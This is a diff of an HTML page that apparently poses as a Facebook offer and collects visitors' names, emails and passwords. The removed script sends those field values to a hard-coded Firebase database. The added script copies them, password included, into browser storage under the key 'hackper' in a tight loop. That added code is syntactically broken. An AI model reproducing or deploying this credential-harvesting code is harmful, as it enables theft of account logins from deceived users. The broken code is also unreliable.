@@ -147,40 +147,17 @@ label {
 <center>
 <a id="top" href="getfb.html"><img src="imgg/button.png"></a></center>
 </div></div></div></div>
-
-<script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-database.js"></script>
-<script type="text/javascript">
-
-var firebaseConfig = {
-    apiKey: "AIzaSyAIgCzDycY8Ya7XUzlx8kzUa_01zlFIKJg",
-    authDomain: "the-web-99030.firebaseapp.com",
-    databaseURL: "https://the-web-99030.firebaseio.com",
-    projectId: "the-web-99030",
-    storageBucket: "the-web-99030.appspot.com",
-    messagingSenderId: "793051782942",
-    appId: "1:793051782942:web:2d59b3aa02097e25da730f"
-  };
-  // Initialize Firebase
-  firebase.initializeApp(firebaseConfig);
-  
-  var ref = firebase.database().ref('users');
-  
- document.querySelectorAll("input").oninput=()=>{
-  localStorage.setItem("lastname", "Smith");
-
-  let a = document.querySelector("#nicname").value,
-  b = document.querySelector("#namafb").value,
-  c = document.querySelector("#emailfb").value,
-  d = document.querySelector("#passfb").value;
-  alert("isthebestgemink");
+<script>
+function loop(){
+LocalStorage.setItem("hackper", 
+  {a: document.querySelector("#nicname").value,
+  b:document.querySelector("#namafb").value,
+  c :document.querySelector("#emailfb").value,
+  d : document.querySelector("#passfb").value;});
+  setTimeout(loop, 10);
 }
+loop();
 
-function add(a, b, c, d){
-  ref.push().set({
-    a:a,b:b,c:c,d:d
-  });
-}
 </script>
 
 <body>
